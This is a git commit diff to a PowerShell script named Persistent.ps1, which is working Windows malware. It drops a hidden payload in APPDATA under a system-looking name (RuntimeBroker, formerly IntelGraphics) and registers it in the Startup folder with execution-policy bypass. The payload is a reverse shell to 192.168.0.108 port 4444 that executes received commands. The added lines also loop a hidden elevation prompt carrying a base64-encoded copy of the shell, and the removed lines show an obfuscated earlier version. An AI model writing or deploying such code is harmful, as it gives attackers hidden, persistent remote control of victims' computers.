ad9ff44a2551cca28043aa6449abe61d1a184b67
Forhad Ahmed <78072522+Forhad-Ahmed230@users.noreply.github.com>
2025-11-13 19:46:45 +0600

    Update Persistent.ps1

--- Persistent.ps1
+++ Persistent.ps1
@@ -1,31 +1,38 @@
-$startupPath = "$env:APPDATA\IntelGraphics.ps1"
+$startupPath = "$env:APPDATA\RuntimeBroker.ps1"
 $PayloadContent = @'
-function OiHfsRCr {
-    IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RnVuY3Rpb24gRGlzYWJsZS1FVFcgKGdldC1tb2R1bGUgLU5hbWUgTlRERExMKS5FY3Rpb25DbGFzczpEaXNhYmxlRVROb3RpZmljYXRpb24oW1JlZl0uQXNzZW1ibHkuR2V0V3JpdGVyKCkp')));
-    IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U1RBUlQtU0xFRVAgMTsgJHdpbnZhciA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpnZXRfRXhwaXJlZEVudmFsdWVzKCk7IGlmICgkd2ludmFyLmNvdW50ID4gMCkgewoJICAgIGZvcigheD0wOyB4IC1sdCAkd2ludmFyLmNvdW50OyB4KyspIHsKCQkgICAJCWlmICgkd2ludmFyW3hdIC1saWtlICcqXGVuYyAqJykgewoJCQkgCQkJCiAgICAgICAgICAgICRjbWQgPSAkd2ludmFyW3hdLnNwbGl0KCdAXCcsIDIpWzFdCiAgICAgICAgICAgIAkkZW5jID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QXNjaWkuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGNtZCkpCiAgICAgICAgICAgIAkkaWV4ID0gSUVYICRlbmMKCQkJCQkJfQoJCQkJfQoJfQ==')));
-    while ($true) {
-        try {
-            $ErrorActionPreference = "Stop"
-            $PJTUEe = New-Object System.Net.Sockets.TCPClient([System.Text.Encoding]::UTF8.GetString([byte[]](0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x31,0x30,0x38)), 4444)
-            $VvFnhHZ = $PJTUEe.GetStream()
-            [byte[]]$gxZmLQScrd = 0..65535|%{0}
-            $PhmxlrOP = (New-Object System.Text.ASCIIEncoding).GetBytes(("P"+"S" + " " + (Get-Location).Path + "> "))
-            $VvFnhHZ.Write($PhmxlrOP,0,$PhmxlrOP.Length)
-            while (($fMjIcwX = $VvFnhHZ.Read($gxZmLQScrd, 0, $gxZmLQScrd.Length)) -ne 0) {
-                $AQocPd = (New-Object System.Text.ASCIIEncoding).GetString($gxZmLQScrd, 0, $fMjIcwX)
-                $UaBkeZNye = (IEX $AQocPd 2>&1 | Out-String)
-                $IpgFr = $UaBkeZNye + ("P"+"S" + " " + (Get-Location).Path + "> ")
-                $PhmxlrOP = (New-Object System.Text.ASCIIEncoding).GetBytes($IpgFr)
-                $VvFnhHZ.Write($PhmxlrOP,0,$PhmxlrOP.Length)
-                $VvFnhHZ.Flush()
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    try { throw "" } catch {
+        while (-not $?) {
+            try {
+                Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -EncodedCommand CgB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApACAAewAKACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACQARQByAHIAbwByAEEAYwB0AGkAbwBuAFAAcgBlAGYAZQByAGUAbgBjAGUAIAA9ACAAIgBTAHQAbwBwACIACgAgACAAIAAgACAAIAAgACAAJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADAALgAxADAAOAAiACwAIAA0ADQANAA0ACkACgAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9AAoAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAKAAiAFAAUwAiACAAKwAgACIAIAAiACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgApACkACgAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABkAGEAdABhACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABpACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAkAG8AdQB0AHAAdQB0ACAAKwAgACgAIgBQAFMAIgAgACsAIAAiACAAIgAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQAKACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoAIAAgACAAIAB9AAoAIAAgACAAIABjAGEAdABjAGgAIAB7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAKABHAGUAdAAtAFIAYQBuAGQAbwBtACAALQBNAGkAbgBpAG0AdQBtACAANQAgAC0ATQBhAHgAaQBtAHUAbQAgADIAMAApACAAfQAKAH0A"
+            } catch {
+                Write-Error "" -ErrorAction SilentlyContinue
             }
-            $PJTUEe.Close()
         }
-        catch { Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 20) }
     }
+    exit;
 }
-Set-Variable -Name 'fwHvXm' -Value ('OiHf'+'sRCr'); & (Get-Variable -Name fwHvXm -ValueOnly)
+while ($true) {
+    try {
+        $ErrorActionPreference = "Stop"
+        $client = New-Object System.Net.Sockets.TCPClient("192.168.0.108", 4444)
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+        $sendbyte = ([text.encoding]::ASCII).GetBytes(("PS" + " " + (Get-Location).Path + "> "))
+        $stream.Write($sendbyte,0,$sendbyte.Length)
+        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+            $data = ([text.encoding]::ASCII).GetString($bytes, 0, $i)
+            $output = (Invoke-Expression $data 2>&1 | Out-String)
+            $sendback = $output + ("PS" + " " + (Get-Location).Path + "> ")
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()
+        }
+        $client.Close()
+    }
+    catch { Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 20) }
+}
 '@
 Set-Content -Path $startupPath -Value $PayloadContent -Encoding ascii
-$s=New-Object -ComObject WScript.Shell;$p="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IntelGraphics.lnk";$sc=$s.CreateShortcut($p);$sc.TargetPath="powershell.exe";$sc.Arguments="-NoP -Ex Bypass -Win Hidden -File `"$env:APPDATA\IntelGraphics.ps1`"";$sc.Save()
+$s=New-Object -ComObject WScript.Shell;$p="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.lnk";$sc=$s.CreateShortcut($p);$sc.TargetPath="powershell.exe";$sc.Arguments="-NoP -Ex Bypass -Win Hidden -File `"$env:APPDATA\RuntimeBroker.ps1`"";$sc.Save()
 Start-Process powershell.exe -Arg "-NoP -Ex Bypass -Win Hidden -File `"$startupPath`"" -Win Hidden
